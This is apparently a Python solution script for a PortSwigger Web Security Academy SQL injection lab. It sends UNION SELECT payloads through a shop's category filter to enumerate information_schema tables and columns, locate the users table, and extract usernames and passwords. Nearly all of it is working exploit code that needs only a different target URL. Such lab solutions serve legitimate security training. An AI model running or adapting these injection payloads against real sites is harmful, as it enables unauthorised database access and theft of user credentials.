# P https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle
import requests
import sys
import re
from bs4 import BeautifulSoup




site = 'ac541f4a1e434b4ac0de7ac900af0035.web-security-academy.net'

s = requests.Session()



def try_category(category_string):
  input(f"Try {category_string}")
  print('trying')
  url = f'https://{site}/filter?category={category_string}'
  print(f"Retrieving https://{site}/filter?category={category_string}")
  resp = s.get(url)
  if resp.status_code != 200:
    print(f'Error code {resp.status_code} with text: {resp.text}\n')
    return resp
  soup = BeautifulSoup(resp.text,'html.parser')
  print(f"{soup.find_all('th')}\n")
  return resp


category = 'Accessories'
try_category(category)
try_category(f"{category}' UNION SELECT null from information_schema.tables -- ")
try_category(f"{category}' UNION SELECT null,null from information_schema.tables -- ")
resp = try_category(f"{category}' UNION SELECT table_name,null from information_schema.tables -- ")

# Parse user table from tags
soup = BeautifulSoup(resp.text,'html.parser')
user_table = soup.find('table').find('th',text=re.compile('^users')).text
print(f"Found user table of {user_table}\n")

resp = try_category(f"{category}' UNION SELECT column_name,column_name from information_schema.columns where table_name='{user_table}' -- ")

# Parse columns from tags
soup = BeautifulSoup(resp.text,'html.parser')
username_col = soup.find('table').find('th',text=re.compile('^username')).text
password_col = soup.find('table').find('th',text=re.compile('^password')).text
print(f"Found username column of {username_col}")
print(f"Found password column of {password_col}")
resp = try_category(f"{category}' UNION SELECT {username_col},{password_col} from {user_table} -- ")
soup = BeautifulSoup(resp.text,'html.parser')
